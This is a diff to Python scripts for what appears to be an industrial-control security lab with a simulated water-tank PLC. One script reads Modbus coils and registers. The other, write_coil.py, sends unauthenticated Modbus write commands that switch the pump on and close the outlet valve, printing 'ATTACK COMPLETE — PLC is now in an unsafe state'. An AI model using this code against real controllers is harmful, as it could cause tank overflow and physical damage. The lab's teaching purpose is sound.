@@ -189,6 +189,7 @@ import sys
 
 try:
     from pymodbus.client import ModbusTcpClient
+    from pymodbus.exceptions import ModbusException
 except ImportError:
     print("[error] pymodbus not installed. Run: pip3 install pymodbus")
     sys.exit(1)
@@ -212,7 +213,14 @@ REG_LABELS = {
 print(f"[*] Connecting to PLC at {PLC_IP}:{PLC_PORT} ...")
 client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
 
-if not client.connect():
+# pymodbus 3.x may raise on connection failure instead of returning False
+try:
+    connected = client.connect()
+except Exception as e:
+    connected = False
+    print(f"[error] Connection exception: {e}")
+
+if not connected:
     print(f"[error] Connection refused — is the simulation running?  ({PLC_IP}:{PLC_PORT})")
     sys.exit(1)
 
@@ -220,29 +228,35 @@ print(f"[+] Connected\n")
 
 # ── FC01 Read Coils 0–2 ───────────────────────────────────────────────────────
 print("=== COILS  (Modbus FC01 — Read Coils) ===")
-coil_result = client.read_coils(address=0, count=3, device_id=1)
-if coil_result.isError():
-    print(f"[error] read_coils failed: {coil_result}")
-else:
-    for idx in range(3):
-        state = "ON  (TRUE) " if coil_result.bits[idx] else "OFF (FALSE)"
-        label = COIL_LABELS.get(idx, f'coil_{idx}')
-        print(f"  Coil {idx}  {label:<35} {state}")
+try:
+    coil_result = client.read_coils(address=0, count=3, device_id=1)
+    if hasattr(coil_result, 'isError') and coil_result.isError():
+        print(f"[error] read_coils failed: {coil_result}")
+    else:
+        for idx in range(3):
+            state = "ON  (TRUE) " if coil_result.bits[idx] else "OFF (FALSE)"
+            label = COIL_LABELS.get(idx, f'coil_{idx}')
+            print(f"  Coil {idx}  {label:<35} {state}")
+except (ModbusException, Exception) as e:
+    print(f"[error] read_coils raised exception: {e}")
 
 print()
 
 # ── FC03 Read Holding Registers 0–2 ──────────────────────────────────────────
 print("=== HOLDING REGISTERS  (Modbus FC03 — Read Holding Registers) ===")
-reg_result = client.read_holding_registers(address=0, count=3, device_id=1)
-if reg_result.isError():
-    print(f"[error] read_holding_registers failed: {reg_result}")
-else:
-    for idx in range(3):
-        raw   = reg_result.registers[idx]
-        label = REG_LABELS.get(idx, f'reg_{idx}')
-        # HR 0 stores level in cm — show human-readable meters alongside
-        display = f"{raw} cm  ({raw / 100.0:.2f} m)" if idx == 0 else str(raw)
-        print(f"  HR   {idx}  {label:<35} {display}")
+try:
+    reg_result = client.read_holding_registers(address=0, count=3, device_id=1)
+    if hasattr(reg_result, 'isError') and reg_result.isError():
+        print(f"[error] read_holding_registers failed: {reg_result}")
+    else:
+        for idx in range(3):
+            raw   = reg_result.registers[idx]
+            label = REG_LABELS.get(idx, f'reg_{idx}')
+            # HR 0 stores level in cm — show human-readable meters alongside
+            display = f"{raw} cm  ({raw / 100.0:.2f} m)" if idx == 0 else str(raw)
+            print(f"  HR   {idx}  {label:<35} {display}")
+except (ModbusException, Exception) as e:
+    print(f"[error] read_holding_registers raised exception: {e}")
 
 print()
 client.close()
@@ -281,6 +295,7 @@ import sys
 
 try:
     from pymodbus.client import ModbusTcpClient
+    from pymodbus.exceptions import ModbusException
 except ImportError:
     print("[error] pymodbus not installed. Run: pip3 install pymodbus")
     sys.exit(1)
@@ -294,10 +309,10 @@ PLC_IP   = os.environ.get('PLC_IP',   '10.200.10.10')
 PLC_PORT = int(os.environ.get('PLC_PORT', '502'))
 
 if RESTORE_MODE:
-    # Safe state: pump off, outlet valve open — water drains normally
+    # Drain state: pump off, outlet valve open — tank level drops back to normal
     PUMP_STATE  = False
     VALVE_STATE = True
-    mode_label  = "RESTORE — return PLC to normal operating state"
+    mode_label  = "RESTORE — stop pump, open outlet valve (tank drains)"
 else:
     # Attack state: pump on, outlet valve closed — tank overflow imminent
     PUMP_STATE  = True
@@ -312,24 +327,42 @@ print()
 print(f"[*] Connecting to PLC ...")
 
 client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
-if not client.connect():
+
+# pymodbus 3.x may raise on connection failure instead of returning False
+try:
+    connected = client.connect()
+except Exception as e:
+    connected = False
+    print(f"[error] Connection exception: {e}")
+
+if not connected:
     print(f"[error] Connection refused — is the simulation running?  ({PLC_IP}:{PLC_PORT})")
     sys.exit(1)
 
 print(f"[+] Connected — sending Modbus FC05 (Write Single Coil) frames ...\n")
 
 # ── Write Coil 0 — inlet pump ─────────────────────────────────────────────────
-r0 = client.write_coil(address=0, value=PUMP_STATE, device_id=1)
-if r0.isError():
-    print(f"[error] write_coil(0) failed: {r0}")
+try:
+    r0 = client.write_coil(address=0, value=PUMP_STATE, device_id=1)
+    if hasattr(r0, 'isError') and r0.isError():
+        print(f"[error] write_coil(0) returned error: {r0}")
+        client.close()
+        sys.exit(1)
+except (ModbusException, Exception) as e:
+    print(f"[error] write_coil(0) raised exception: {e}")
     client.close()
     sys.exit(1)
 print(f"[+] Coil 0 (inlet pump)    → {'TRUE  (ON)'   if PUMP_STATE  else 'FALSE (OFF)'}   — FC05 write ACK'd")
 
 # ── Write Coil 1 — outlet valve ───────────────────────────────────────────────
-r1 = client.write_coil(address=1, value=VALVE_STATE, device_id=1)
-if r1.isError():
-    print(f"[error] write_coil(1) failed: {r1}")
+try:
+    r1 = client.write_coil(address=1, value=VALVE_STATE, device_id=1)
+    if hasattr(r1, 'isError') and r1.isError():
+        print(f"[error] write_coil(1) returned error: {r1}")
+        client.close()
+        sys.exit(1)
+except (ModbusException, Exception) as e:
+    print(f"[error] write_coil(1) raised exception: {e}")
     client.close()
     sys.exit(1)
 print(f"[+] Coil 1 (outlet valve)  → {'TRUE  (OPEN)' if VALVE_STATE else 'FALSE (CLOSED)'} — FC05 write ACK'd")
@@ -340,12 +373,12 @@ print()
 if RESTORE_MODE:
     print("[+] PLC restored to normal operating state.")
     print("    Coil 0 = FALSE (pump OFF) | Coil 1 = TRUE (valve OPEN)")
-    print("    Tank level will stabilise. Check Grafana to confirm.")
+    print("    Tank level will drop back toward 500 cm. Check Grafana or the OT canvas.")
 else:
     print("[+] ATTACK COMPLETE — PLC is now in an unsafe state.")
     print("    Coil 0 = TRUE  (pump ON)  | Coil 1 = FALSE (valve CLOSED)")
     print("    Inlet water is accumulating with no outlet — tank overflow imminent.")
-    print("    Watch the tank level (Holding Register 0) rise in Grafana.")
+    print("    Watch the Water Tank icon in the OT canvas and the tank_level register in Grafana.")
     print()
     print("    To restore normal operation:  python3 write_coil.py --restore")
 PYEOF
